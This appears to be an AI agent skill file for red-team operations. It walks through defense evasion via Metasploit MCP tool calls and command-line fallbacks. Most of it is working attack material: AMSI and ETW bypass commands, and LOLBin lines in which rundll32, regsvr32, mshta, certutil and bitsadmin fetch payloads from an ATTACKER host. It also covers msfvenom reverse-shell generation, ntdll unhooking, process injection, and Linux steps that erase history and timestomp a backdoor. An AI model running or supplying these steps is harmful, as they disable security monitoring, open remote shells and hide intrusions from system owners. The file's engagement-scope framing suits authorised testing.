---
name: red-team-evasion
description: >-
  Guides OPSEC, EDR evasion, and defensive control bypass including AMSI, AppLocker,
  ETW patching, process injection, PPID spoofing, and living-off-the-land techniques.
  Use before noisy actions or when encountering AV/EDR controls.
---

# Red Team Evasion

## Prerequisites

- Target is in scope (`scope/scope-master.txt`, engagement ROE).
- Document defensive controls before selecting payloads.
- Evasion techniques may violate blue-team rules; confirm ROE allows bypass testing.

## Workflow

```
Task Progress:
- [ ] Enumerate defenses (AV, EDR, AppLocker, AMSI, ETW, firewall)
- [ ] Review OPSEC checklist
- [ ] Select evasion path matched to control and noise tolerance
- [ ] Test payload in lab slice before production target
- [ ] Log what was tried and detection outcome in evidence
```

## OPSEC checklist

Before any action:

- Verify target IP/domain in scope
- Use engagement-specific infrastructure
- Avoid default MSF template signatures
- Minimize child process anomalies
- Document every technique and detection result
- Throttle activity to avoid alert storms

## Defense enumeration

**MSF MCP (preferred):**

```text
msf_run_post_module(
  module_name="post/windows/gather/enum_av_excluded",
  engagement_id="<id>",
  session_id=<sid>,
  options={}
)
msf_run_post_module(
  module_name="post/windows/gather/enum_applications",
  engagement_id="<id>",
  session_id=<sid>,
  options={}
)
```

**CLI fallback:**

```powershell
Get-MpComputerStatus
Get-MpPreference
Get-Process | Where-Object {$_.ProcessName -match "defender|crowdstrike|sentinel|csfalcon"}
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ExecutionPolicy -List
```

## AMSI bypass

### MSF AMSI-aware modules

**MSF MCP (preferred):**

```text
msf_search_modules(query="amsi bypass")
msf_module_check(
  module_name="exploit/windows/local/amsi_bypass_powershell",
  engagement_id="<id>",
  module_type="exploit",
  options={"SESSION": <sid>}
)
msf_run_exploit(
  module_name="exploit/windows/local/amsi_bypass_powershell",
  engagement_id="<id>",
  options={"SESSION": <sid>}
)
msf_module_check(
  module_name="exploit/windows/local/amsi_bypass_script",
  engagement_id="<id>",
  module_type="exploit",
  options={"SESSION": <sid>}
)
msf_run_exploit(
  module_name="exploit/windows/local/amsi_bypass_script",
  engagement_id="<id>",
  options={"SESSION": <sid>}
)
```

**CLI fallback:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
powershell -ep bypass -File script.ps1
Set-ExecutionPolicy Bypass -Scope Process -Force
```

Alternative: AMSI.dll patch in memory, obfuscated PowerShell, execute via unmanaged code (C#/BOF).

## AppLocker bypass paths

**MSF MCP (preferred):**

```text
msf_module_check(
  module_name="exploit/windows/misc/regsvr32_applocker_bypass",
  engagement_id="<id>",
  module_type="exploit",
  options={"RHOSTS": "<target>"}
)
msf_run_exploit(
  module_name="exploit/windows/misc/regsvr32_applocker_bypass",
  engagement_id="<id>",
  options={"RHOSTS": "<target>", "PAYLOAD": "windows/meterpreter/reverse_https", "LHOST": "<attacker>", "LPORT": 443}
)
msf_module_check(
  module_name="exploit/windows/misc/mshta_relay",
  engagement_id="<id>",
  module_type="exploit",
  options={"RHOSTS": "<target>"}
)
msf_run_exploit(
  module_name="exploit/windows/misc/mshta_relay",
  engagement_id="<id>",
  options={"RHOSTS": "<target>", "PAYLOAD": "windows/meterpreter/reverse_https", "LHOST": "<attacker>", "LPORT": 443}
)
```

**CLI fallback:**

```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:https://ATTACKER/x.sct").Exec()
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Temp\p.exe
```

## ETW patching

**MSF:** No direct module; use CLI/BOF.

**CLI fallback:**

```powershell
# Patch ntdll!EtwEventWrite (use BOF/shellcode in practice)
# Example C# snippet compiled to in-memory assembly:
# byte[] patch = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax,rax; ret
# VirtualProtect(EtwEventWrite, patch)

reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v Start /t REG_DWORD /d 0 /f
```

Prefer indirect syscalls and unhooking over blind ETW disable when possible.

## Unhooking ntdll (runnable example)

**MSF:** No direct module; use CLI.

**CLI fallback:**

```csharp
// Minimal unhooking concept (compile to BOF or .NET in-memory)
// 1. Read clean ntdll.dll from C:\Windows\System32\ntdll.dll
// 2. Parse PE, locate .text section
// 3. VirtualProtect hooked ntdll .text -> RW
// 4. memcpy clean .text over hooked .text
// 5. VirtualProtect back to RX

// PowerShell one-liner to load fresh ntdll copy (lab only):
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
# Use SharpUnhooker or HellsGate/HaloGate implementations
```

```bash
# Using known tools
SharpUnhooker.exe -p <pid>
# Or sRDI shellcode with unhook stub before payload execution
```

Steps: read clean `ntdll.dll` from disk, map fresh `.text` over hooked copy, execute payload with restored syscalls.

## Direct/indirect syscalls (runnable example)

**MSF:** No direct module; use CLI.

**CLI fallback:**

```nasm
; Direct syscall stub (x64) - NtAllocateVirtualMemory SSN varies by build
mov r10, rcx
mov eax, 0x18        ; SSN for target build (lookup required)
syscall
ret
```

```bash
# SysWhispers3 / HellHall generate syscall stubs
python syswhispers.py -a x64 -c msvc -m NtAllocateVirtualMemory,NtProtectVirtualMemory -o syscalls
# Compile generated files with payload
```

Use when usermode hooks on `ntdll` are detected. Resolve SSN per Windows build.

## EDR evasion: custom payload generation

**MSF MCP (preferred):**

```text
msf_search_modules(query="evasion")
msf_list_payloads(query="windows")
msf_generate_payload(
  payload="windows/x64/meterpreter/reverse_https",
  format="exe",
  options={"LHOST": "<attacker>", "LPORT": 443, "EnableStageEncoding": true, "StageEncoder": "x64/xor"},
  engagement_id="<id>"
)
msf_start_listener(
  payload="windows/x64/meterpreter/reverse_https",
  lhost="<attacker>",
  lport=443,
  engagement_id="<id>"
)
```

**CLI fallback:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker> LPORT=443 -e x64/xor -i 3 -f exe -o payload.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f raw -o shell.bin
# Inject shell.bin via custom loader (RW -> RX, no RWX)
```

Many EDRs flag default MSF templates. Custom BOF/shellcode when EDR present.

## Process injection

**MSF MCP (preferred):**

```text
msf_run_post_module(
  module_name="post/windows/manage/migrate",
  engagement_id="<id>",
  session_id=<sid>,
  options={"PID": <target_pid>}
)
msf_run_post_module(
  module_name="post/windows/manage/reflective_dll_inject",
  engagement_id="<id>",
  session_id=<sid>,
  options={"PID": <target_pid>, "PATH": "/path/to/payload.dll"}
)
```

**CLI fallback:**

```powershell
# Inject into explorer.exe (conceptual - use Cobalt Strike shinject or custom BOF)
# QueueUserAPC, NtMapViewOfSection preferred over CreateRemoteThread
```

| Method | Notes |
|--------|-------|
| NtMapViewOfSection | Process hollowing variant |
| QueueUserAPC | Early bird injection |
| Module stomping | Overwrite legitimate DLL .text |

## PPID spoofing

**MSF:** No direct module; use CLI/BOF.

**CLI fallback:**

```powershell
# STARTUPINFOEX with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# Tools: Cobalt Strike spawnto, custom BOFs
# Goal: child appears spawned by explorer.exe
```

## Living-off-the-land binaries (LOLBins)

**MSF MCP (preferred):**

```text
msf_module_check(
  module_name="exploit/windows/misc/regsvr32_applocker_bypass",
  engagement_id="<id>",
  module_type="exploit",
  options={"RHOSTS": "<target>"}
)
msf_run_exploit(
  module_name="exploit/windows/misc/regsvr32_applocker_bypass",
  engagement_id="<id>",
  options={"RHOSTS": "<target>", "PAYLOAD": "windows/meterpreter/reverse_https", "LHOST": "<attacker>", "LPORT": 443}
)
msf_module_check(
  module_name="exploit/windows/smb/smb_relay",
  engagement_id="<id>",
  module_type="exploit",
  options={"RHOSTS": "<target>"}
)
msf_run_exploit(
  module_name="exploit/windows/smb/smb_relay",
  engagement_id="<id>",
  options={"RHOSTS": "<target>"}
)
```

**CLI fallback:**

```cmd
certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Temp\p.exe
bitsadmin /transfer job /download http://ATTACKER/payload.exe C:\Temp\p.exe
mshta http://ATTACKER/payload.hta
regsvr32 /s /n /u /i:http://ATTACKER/file.sct scrobj.dll
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c calc"
```

## Linux evasion

**MSF MCP (preferred):**

```text
msf_run_post_module(
  module_name="post/linux/manage/remove_files",
  engagement_id="<id>",
  session_id=<sid>,
  options={"FILES": "/tmp/.payload"}
)
```

**CLI fallback:**

```bash
unset HISTFILE
export HISTFILE=/dev/null
history -c
touch -r /bin/ls /tmp/backdoor
mv payload .systemd-private-XXXX
```

## Metasploit integration before exploit delivery

**MSF MCP (preferred):**

```text
msf_module_check(
  module_name="exploit/...",
  engagement_id="<id>",
  module_type="exploit",
  options={"RHOSTS": "<target>"}
)
msf_run_exploit(
  module_name="exploit/...",
  engagement_id="<id>",
  options={"RHOSTS": "<target>", "PAYLOAD": "...", "LHOST": "<attacker>", "LPORT": 443}
)
```

Prefer `msf-exploit-chain` for full delivery workflow. Document encoder/payload choices and detection outcomes.

## Related skills

- `windows-pentest` - privesc and credential theft after bypass
- `linux-pentest` - host-level evasion on Linux footholds
- `msf-exploit-chain` - payload selection, handlers, exploit delivery
- `persistence-pentest` - persistence deployment after bypass (ROE required)
- `initial-access-pentest` - delivery chain OPSEC for external entry
